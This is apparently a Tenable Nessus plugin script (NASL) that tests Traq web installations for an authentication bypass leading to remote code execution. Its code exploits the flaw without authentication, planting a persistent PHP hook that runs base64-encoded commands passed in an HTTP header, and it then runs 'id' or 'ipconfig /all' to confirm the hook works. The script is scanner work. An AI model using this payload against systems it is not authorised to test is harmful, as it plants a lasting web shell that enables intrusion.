#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62892);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_bugtraq_id(50961);
  script_osvdb_id(77556);
  script_xref(name:"EDB-ID", value:"18213");

  script_name(english:"Traq admincp/common.php authenticate() Function Authentication Bypass Remote Code Execution");
  script_summary(english:"Attempts to execute arbitrary PHP code");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that allows arbitrary code
execution.");
  script_set_attribute(attribute:"description", value:
"The version of Traq installed on the remote host contains a flaw that
could allow a remote attacker to bypass the authentication mechanism and
inject and execute arbitrary code.  The flaw is caused by the
application failing to properly restrict admin rights in the
'authenticate()' function in 'admincp/common.php'. 

Note that successful exploitation of this issue, such as by this plugin,
results in a persistent change to the site.  To undo this change, the
'traq_plugin_code' table of the MySQL database will need to be modified
to remove the code added by this plugin.");
  script_set_attribute(attribute:"see_also", value:"http://www.saintcorporation.com/cgi-bin/exploit_info/traq_authenticate");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Traq 2.3 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Traq admincp/common.php Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/12/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/12/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:traq:traq");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("traq_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/traq", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "traq",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
vuln = FALSE;
install_url = build_url(qs:dir+'/', port:port);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = toupper((SCRIPT_NAME - ".nasl"));

# Send our exploit which is stored in the sql table traq_plugin_code
attack_str = "plugin_id=1&title=1&execorder=0&hook=template_footer&code=error_reporting(0);print("+token+");passthru(base64_decode($_SERVER[HTTP_"+token+"]));die;";

res = http_send_recv3(
  port         : port,
  method       : "POST",
  item         : dir + '/admincp/plugins.php?newhook',
  data         : attack_str,
  add_headers  : make_array(
    "Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

exp_request = http_last_sent_request();

# Send a command and see if our exploit is a success
foreach cmd (cmds)
{
  # convert our command to base64
  b64cmd = base64(str:cmd);

  url = dir + "/index.php";
  res2 = http_send_recv3(
    method       : "GET",
    item         : url,
    port         : port,
    add_headers  : make_array(token, b64cmd),
    exit_on_fail : TRUE
  );

  get_request = http_last_sent_request();

  if (egrep(pattern:cmd_pats[cmd], string:res2[2]))
  {
    # Replace ^M character if we encounter it
    out =  str_replace(string:res2[2], find:raw_string(0x0D), replace:'');
    output = strstr(out, token) - token;
    vuln = TRUE;
  }
  if (vuln) break;
}

if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Traq", install_url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was able to verify the issue exists using the following pair' +
    '\n' + 'of requests :' +
    '\n' +
    '\n' + snip +
    '\n' + exp_request +
    '\n' + snip +
    '\n' + get_request +
    '\n' + snip +
    '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\n' + 'This executed the command "'+ cmd +'" which produced the following ' +
      '\n' + 'output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
   security_hole(port:port, extra:report);
}
else security_hole(port);
